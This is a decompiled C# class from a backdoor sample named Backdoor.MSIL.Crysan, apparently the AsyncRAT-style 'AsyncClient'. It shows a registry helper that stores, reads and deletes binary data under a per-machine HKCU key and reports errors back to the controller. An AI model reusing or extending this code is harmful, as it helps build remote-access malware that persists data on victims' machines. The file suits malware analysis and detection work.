// Decompiled with JetBrains decompiler
// Type: Client.Helper.SetRegistry
// Assembly: AsyncClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A19C81AD-DCA7-4942-AD7B-C0D73F667431
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\Backdoor.MSIL.Crysan.ecy-6bb030430aef2b33ca1f8db61690c001754e9c2dae78e22b11a178959cd4c7a2.exe

using Client.Handle_Packet;
using Microsoft.Win32;
using System;

namespace Client.Helper
{
  public static class SetRegistry
  {
    private static readonly string ID = "Software\\" + Settings.Hwid;

    public static bool SetValue(string name, byte[] value)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
        {
          subKey.SetValue(name, (object) value, RegistryValueKind.Binary);
          return true;
        }
      }
      catch (Exception ex)
      {
        Packet.Error(ex.Message);
      }
      return false;
    }

    public static byte[] GetValue(string value)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID))
          return (byte[]) subKey.GetValue(value);
      }
      catch (Exception ex)
      {
        Packet.Error(ex.Message);
      }
      return (byte[]) null;
    }

    public static bool DeleteValue(string name)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID))
        {
          subKey.DeleteValue(name);
          return true;
        }
      }
      catch (Exception ex)
      {
        Packet.Error(ex.Message);
      }
      return false;
    }

    public static bool DeleteSubKey()
    {
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("", true))
        {
          registryKey.DeleteSubKeyTree(SetRegistry.ID);
          return true;
        }
      }
      catch (Exception ex)
      {
        Packet.Error(ex.Message);
      }
      return false;
    }
  }
}
